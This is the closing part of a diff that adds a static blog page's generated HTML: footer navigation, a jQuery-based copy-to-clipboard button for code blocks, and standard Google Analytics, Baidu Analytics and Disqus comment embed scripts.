+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search">Search</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/link">Links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-133464311-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
